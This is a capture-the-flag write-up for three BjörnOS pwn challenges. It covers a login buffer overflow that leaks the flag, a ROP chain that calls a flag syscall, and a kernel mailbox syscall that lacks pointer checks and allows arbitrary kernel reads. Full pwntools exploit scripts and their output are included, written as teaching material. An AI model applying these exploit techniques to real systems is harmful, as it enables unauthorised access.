# BjörnCTF 2020 - BjörnOS [pwn 484 + 484 + 500]

## Summary

This is a series of 3 pwn challenges where we have to exploit a custom operating
system that runs inside QEMU. We first exploit a buffer overflow in the login
program to get the first flag, then gain code execution in userland to get the
second, and finally pwn the kernel to get the third.

## Part 1: login

> I found a computer of the kidnappers that I heard is vulnerable. Unfortunately, it is running a custom operating system. I was able to get a hold of the boot floppy and also managed to extract the kernel as well as the login module. For now, the login module should be enough though. I also noticed, that the floppy has something written on it:
>
> BjörnOS: An operating system for ice bears.

The challenge contains a floppy disk image (`floppy.img`), two ELF executables
for x86 (`kernel` and `login`), and scripts to run it all in QEMU. When we mount
the disk image, we can see that it contains copies of `kernel` and `login` and
the GRUB bootloader in the `boot/grub` folder. This folder also contains
`menu.lst`, the configuration file for GRUB.

```
default 0
timeout 0

title alpha
root (fd0)
kernel /kernel flagbot{this_is_a_test_flag}
# module /modules/init u
# module /modules/ps2 u
# module /modules/cmos u
# module /modules/vt u
# module /modules/rootfs u
# module /modules/ramfs u
# module /modules/vfs u
module /modules/login flagbot{this_is_a_test_flag} u
boot
```

The boot script tells GRUB to boot the kernel and then run the login program.
It also gives a test flag as a command line argument to both the kernel and
`login`. We can see what the interface looks like by starting the target in
QEMU:
```
$ ./run.sh

[...]

Welcome to BjörnOS!
login: asdf

password for asdf
: asdf

Sorry my friend, you have yet to learn the power of overflowing a buffer!
```
We can see that we are indeed interacting with `login` over a serial port. Our
random username/password obviously didn't work, but the challenge already nudges
us in the right direction: we have to overflow a buffer.

With that in mind, let's have a look at the binaries. We will analyze `login`
first because that is what we are interacting with on the serial port. Both
binaries are in standard ELF format for x86, so we can simply load them into our
favorite analysis tools. We used Ghidra for this challenge because it has a
decompiler, and reading C pseudocode is much easier than reading assembly. While
decompilers don't always produce accurate output, they are usually enough for
pwn tasks which are usually simple binaries. On top of that, both binaries from
this challenge have debug symbols which really help the decompiler.

`login`'s main function looks like this:
```c
s32 module_main(s32 argc,s8 **argv)

{
  s8 *psVar1;
  s32 sVar2;
  s8 **full_cmd;
  s8 password [16];
  s8 username [16];
  s8 flag [32];

  psVar1 = strchr(*argv,0x20);
  strncpy(flag,psVar1 + 1,0x20);
  kprintf("Welcome to BjörnOS!\n");
  kprintf("login: ");
  getline(username);
  kprintf("\npassword for %s: ",username);
  getnline(password,0x10);
  sVar2 = strcmp(password,flag);
  if (sVar2 != 0) {
    kprintf("\nSorry my friend, you have yet to learn the power of overflowing a buffer!");
    return 0;
  }
  kprintf("\nWell done my friend, now give me more data: ");
  getline(username);
  return 0;
}

```
This function uses `kprintf` to print output, and `getline` and `getnline` to
read from the serial port. `getnline` seems to have bounds checking because it
takes the length of the buffer as the second argument, but `getline` only takes
the address of the buffer and so it likely doesn't do any sort of bounds
checking. We found our buffer overflow.

Since `username` is located on the stack we could smash the stack and overwrite
the return address of the function with one of our choosing to take control of
the program. However while that works, there is also an easier way: let's have a
look at the function's stack frame layout to see what we would be overflowing
into (the highest memory address is at the top):

```
s32        Stack[0x4]:4   argc
s8 **      Stack[0x8]:4   argv
s8[32]     Stack[-0x2c]   flag
s8[16]     Stack[-0x3c]   username
s8[16]     Stack[-0x4c]   password
```

`flag` is located immediately after `username`, and `username` is printed right
after our call to `getline`. C strings are null-terminated and if we fill
`username` with non-null characters we will erase its null terminator.
When `login` later prints the username, `kprintf` will not stop at the end of
the buffer and also print out the flag. This would not work if `getline` added
a null terminator at the end of the input like the standard C `gets`, but as luck
would have it `getline` doesn't add any null terminators.

This is very easy to exploit: we just have to enter a 15 character username (the
newline character takes the last slot in the buffer).

```
$ nc pwn.flagbot.ch 8070

[...]

Welcome to BjörnOS!
login: AAAAAAAAAAAAAAA
AAAAAAAAAAAAAAA

password for AAAAAAAAAAAAAAA
bjorn{foreign_os_same_exploit}:
```

## Part 2 - userland

> I found another computer running the same operating system. Unfortunately, it looks like the login module does not receive the flag anymore. I have overheard something about a "suissecall" though.

Indeed, "suissecall" sounds familiar 😉

Part 2 has the same format as the previous. However this time `login` does not
receive the flag anymore:
```
default 0
timeout 0

title alpha
root (fd0)
kernel /kernel flagbot{this_is_a_test_flag}
# module /modules/init u
# module /modules/ps2 u
# module /modules/cmos u
# module /modules/vt u
# module /modules/rootfs u
# module /modules/ramfs u
# module /modules/vfs u
module /modules/login u
boot
```
This means that we have to extract it from the kernel somehow. Let's open the
kernel in Ghidra and see what's inside.

In an OS, userland programs interact with the kernel through system calls
(or syscalls). The kernel usually has a handler function for each syscall
and a centralized entry point that selects and runs the right handler. In the
challenge's kernel this is the function `syscall_handler`, which is basically
a big switch-case. Since the pseudocode for this function is fairly long, I
cut out the parts that are irrelevant to the task:

```c
cpu_state_t *syscall_handler(cpu_state_t *state)
{
    switch(state->eax) {
    /* Other cases... */

    case 0x37:
        kprintf("Here is your flag: %s\n", cmdline);
        return state;

    /* Other cases... */
    }
}
```

Ok, that seems pretty easy! We only have to invoke syscall 0x37 from userspace
and the kernel will print out the flag. But how do we do that? On Linux userspace
programs invoke syscalls by putting the arguments in the right registers, the
syscall number in `eax`, and executing the `int 0x80` instruction. One way to
find out is to disassemble the login program and look for the functions that
invoke system calls.

```
void __cdecl kcon_puts(s8 * s)

push ebx
mov eax, 0x1
mov ebx, dword ptr [esp + s]
int 0x30
pop ebx
ret

```

This looks very similar to how system calls work on Linux, except it uses
`int 0x30` instead of `int 0x80`. We already know that `eax` holds the system
call number because we saw that the syscall handler switches on the value of
`eax`. Our target system call does not take any arguments so we don't need to
worry about those for now. All we have to do is set eax to 0x37 and execute
`int 0x30` from userspace. Therefore our next step is to find a vulnerability
in `login` that lets us execute arbitrary code in userspace.

```c
s32 module_main(s32 argc,s8 **argv)
{
  s8 username [16];

  kprintf("Welcome to BjörnOS 2.0!\n");
  kprintf("login: ");
  getnline(username,0x10);
  check_password(username);
  return 0;
}

u8 check_password(s8 *username)
{
  s32 sVar1;
  s8 password [16];

  kprintf("\npassword for %s: ",username);
  getnline(password,0x400);
  sVar1 = strcmp("easy\n",password);
  if (sVar1 != 0) {
    kprintf("\nSorry my friend, this is the wrong password\n");
    return '\0';
  }
  kprintf("\nLogged in! Have you heard about our syscalls yet?\n");
  kprintf("P.S. We value security very much, so your password is safely stored at 0x%x\n",password);
  kprintf("P.P.S Please don\'t try anything stupid with the value at 0x%x\n",register0x00000010);
  return '\0';
}
```

This version doesn't use `getline` anymore but it uses `getnline` with a length
of 0x400 to read data into a 16 byte stack buffer, which means that we still
have an exploitable buffer overflow. Awesome! We can exploit this by overwriting
the return address of `check_password`. This OS doesn't seem to implement
non-executable memory we could place some shellcode on the stack and jump to it,
but I chose to go with a ROP chain purely out of habit. The OS doesn't have
ASLR either so we don't need an infoleak, and `login` has plenty of gadgets.

```py
from pwn import *

r = remote('pwn.flagbot.ch', 8071)

rop = b''.join([
    # Set eax to 0x37
    p32(0x40004467), # pop eax; ret;
    p32(0x37),

    # Invoke syscall
    p32(0x400000FA), # int 0x30
])

r.sendlineafter(b'login: ', b'a')
r.sendlineafter(b'password for a', b'A' * 28 + rop)

r.interactive()
```

The target will crash immediately after returning from the syscall, but we don't
really care because by that time it will have already printed the flag.

```
$ python3 exploit.py
[+] Opening connection to pwn.flagbot.ch on port 8071: Done
[*] Switching to interactive mode

: AAAAAAAAAAAAAAAAAAAAAAAAAAAAgD\x007\x00\x00\x00@

Sorry my friend, this is the wrong password
Here is your flag: /kernel bjorn{4h_th3y_me4nt_syscall}
```

## Part 3 - kernel

> Seems like they finally distrust userland code. But apparently the kernel code is still littered with bugs.

The setup for this part is the same as the second part, except that the
`get_flag` system call has now been patched:
```c
cpu_state_t *syscall_handler(cpu_state_t *state)
{
    switch(state->eax) {
    /* Other cases... */

    case 0x37:
        kprintf("The secret you are looking for is in another castle (@ 0x%x)\n", cmdline);
        return state;

    /* Other cases... */
    }
}
```

It is no longer possible to get the flag directly from the kernel so we will
have to find another way. We do not need to get full code execution in the
kernel, we simply need to be able to read its memory. We can still use the
exploit from part 2 to see where the flag is stored in memory:
```
[+] Opening connection to pwn.flagbot.ch on port 8072: Done
[*] Switching to interactive mode

: AAAAAAAAAAAAAAAAAAAAAAAAAAAAgD\x007\x00\x00\x00@

Sorry my friend, this is the wrong password
The secret you are looking for is in another castle (@ 0x2000)
```

The challenge OS has 55 system calls and most of them are fairly small, so it's
feasible to manually audit all of them for vulnerabilities. In the past I've
found that custom/hobby OSes often have bad or no input validation in syscalls,
so I started by looking at that. `kcon_puts` (the system call that prints to the
serial console) is system call 1 and it already tells us some useful facts:
```c
  case 1:
    if (state->ebx < 0x40000000) {
      state->eax = 0x80000002;
      return state;
    }
    kcon_puts(state->ebx);
    state->eax = 1;
    return state;
```

Firstly we can see that there is indeed some form of input validation: `ebx`
contains the address of the string to print and the syscall handler checks that
this contains a userspace address. Had this check been missing we would have
been able to print the flag by simply passing 0x2000 to `kcon_puts`, even though
the flag is not in userspace memory. It appears that this OS uses a fixed split
for virtual memory: all addresses below 0x40000000 belong to the kernel and
the others belong to userspace.

More importantly, we can also see that input validation seems to have been done
in an ad-hoc way: mainstream kernels like Linux always dereference user-provided
pointers using special functions that have this kind of check built in
(`copy_from_user` and `copy_to_user`). This makes it harder for programmers to
forget input validation and easier for reviewers to catch such mistakes. The
author of this kernel did not do that and instead wrote the validation code
manually each time. Therefore it is possible that they forgot a check somewhere.
This is promising, so let's audit the kernel for this kind of mistake.

I spent some time skimming through all the system call handlers to search for
missing validation and finally found something in `mbox_add` (part of the code
omitted for clarity):
```c

s32 mbox_add(process_t *caller,process_t *p,ipcid_t id,void *payload,u32 length)
{
  if ((length > 0x1000) || (payload == NULL)) {
    return -0x7ffffffb;
  }

  mbox_t *mailbox = _mbox_find(p,id);
  if (mailbox == NULL) {
    return -0x7ffffffd;
  }

  /* ... */

  _mboxitem *item = kmalloc(8);
  if (item == NULL) {
    sVar1 = -0x7ffffffc;
  }

  void *dst = kmalloc(length);
  item->payload = dst
  if (dst == NULL) {
    kfree(item);
    return -0x7ffffffc;
  }

  memcpy(dst, payload, length); // <----------------------------

  item->length = length;
  queue_add(mailbox->items, item);
  mailbox->count = mailbox->count + 1;

  return 1;
}
```

We can see that while this function does do some input validation, it is not
checking that `payload` points to user memory. `payload` is a system call
argument which is fully controlled by the userspace process. The system
call handler doesn't do any validation on it either, so we can memcpy up to
0x1000 bytes from any address to a buffer somewhere in the kernel. This function
is part of the `mbox_` family of system calls which seems to implement a sort
of FIFO queue (a "mailbox") for interprocess communication. Processes can create
a mailbox and use it to receive messages from other processes. When a process
wants to send data to a mailbox it calls `mbox_add` which `memcpy`s the data
from the given address to a buffer in the kernel and adds this buffer to the
mailbox's queue. Since there are no checks on the source address of the memcpy
we can read any memory in the kernel by sending a message to a mailbox with
the data we want to read as `payload` and then retrieve it using `mbox_get`.
We can use this vulnerability to retrieve the content of the flag to a userspace
address and then print them to the console.

Since `login` is the same as in the previous part, we can reuse the exploit for
part 2 but change the ROP chain so that it creates a mailbox, sends a message
to it, receives it to an address in userspace (e.g., somewhere in .bss) and
finally prints it with `kcon_puts`. Again, I could have done this by writing
shellcode somewhere in memory but I did it using ROP purely out of habit.

```py
from pwn import *

def set_eax(eax):
    return b''.join([
    p32(0x40004467), # pop eax; ret;
    p32(eax),
])

def set_ebx(ebx):
    return b''.join([
    # 0x400033a0: pop ebx; ret;
    p32(0x400033a0),
    p32(ebx),
])

def set_ecx_edx(ecx, edx):
    return b''.join([
    # 0x4000016c: pop edx; pop ecx; ret;
    p32(0x4000016c),
    p32(edx),
    p32(ecx),
])

def set_ebx_esi_edi(ebx, esi, edi):
    return b''.join([
    # 0x4000038b: pop ebx; pop esi; pop edi; ret;
    p32(0x4000038b),
    p32(ebx),
    p32(esi),
    p32(edi),
])

int30_ret = p32(0x40000145)

def create_mailbox(ipc_id, limit, msg_size, flags):
    return b''.join([
        set_ebx_esi_edi(ipc_id >> 32, msg_size, flags),
        set_ecx_edx(ipc_id & 0xffffffff, limit),
        set_eax(0x22),
        int30_ret,
    ])

def mailbox_add(pid, ipc_id, payload, length):
    return b''.join([
        set_ebx_esi_edi(pid, payload, length),
        set_ecx_edx(ipc_id >> 32, ipc_id & 0xffffffff),
        set_eax(0x2a),
        int30_ret,
    ])

def mailbox_get(pid, ipc_id, payload, len_maxlen_addr):
    return b''.join([
        set_ebx_esi_edi(pid, payload, len_maxlen_addr),
        set_ecx_edx(ipc_id >> 32, ipc_id & 0xffffffff),
        set_eax(0x2b),
        int30_ret,
    ])

def puts(addr):
    return b''.join([
        set_ebx(addr),
        set_eax(1),
        int30_ret,
    ])

r = remote('pwn.flagbot.ch', 8072)

rop_start = 0x40007f94
bss = 0x40006008

rop = b''.join([
    create_mailbox(0, 2, 1000, 0),
    mailbox_add(1, 0, 0x2000, 100),
    mailbox_get(1, 0, bss, rop_start + 4),
    puts(bss),
])

assert b'\n' not in rop and len(rop) < 0x400

r.sendlineafter(b'login: ', b'a')
r.sendlineafter(b'password for a', b'A' * 28 + rop)

r.interactive()
```

```
$ python3 exploit2.py
[+] Opening connection to pwn.flagbot.ch on port 8072: Done
[*] Switching to interactive mode

: AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x03\x00\x00\x00\\x03\x00\x00\x00\x00\x00\x00\x00\x00gD\x00"\x00\x00E\x00\x8b\x03@\x00\x00\x00\x00d\x00\x00l\x00\x00\x00\x00\x00\x00\x00D\x00*\x00\x00E\x00\x8b\x03@\x00\x0`\x00\x98\x7f\x00@l\x00@\x00\x00\x00\x00\x00D\x00+\x00\x00E\x00\xa03\x0`\x00@gD\x00\x00\x00\x00

Sorry my friend, this is the wrong password
/kernel bjorn{n0w_g3t_cod3_ex3cuti0n}
```

And that's it! Getting code execution would not have been hard because `mbox_get`
essentially has the exact same vulnerability as `mbox_add` but in reverse (it
gives you an arbitrary *write* rather than an arbitrary *read*) and we could
have used it to overwrite a system call handler or a return address. However we
didn't need it to get the flag so I didn't write an exploit that does it (but
you can always try!).

## Conclusion

I want to thank the author of these three tasks, they were great fun to solve
and interesting. Unfortunately I didn't have a lot of time to play during the
weekend of the CTF and only managed to solve pwn challenges and one reverse.
I'm sure the other categories would have been great fun too. Still, we got first
blood on all 3 levels of this task and we are the only team who solved part 3,
so I'm not disappointed.
